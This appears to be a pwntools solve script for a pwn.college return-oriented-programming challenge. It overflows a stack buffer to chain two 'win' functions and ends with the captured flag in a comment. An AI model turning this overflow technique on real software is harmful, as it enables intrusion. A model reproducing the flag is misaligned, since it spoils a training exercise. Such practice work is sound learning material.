from pwn import *

s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
elf = ELF("./babyrop_level2.1")
win1 = elf.sym[b'win_stage_1']
win2 = elf.sym[b'win_stage_2']

io = s.process('/challenge/babyrop_level2.1')
io.send(b'a'*0x58 + p64(win1) + p64(win2))

io.interactive()
# Flag: pwn.college{8tD8Ayy7LvJ5_7zq8qT9s3bzifA.0FN0MDLxIjNyEzW}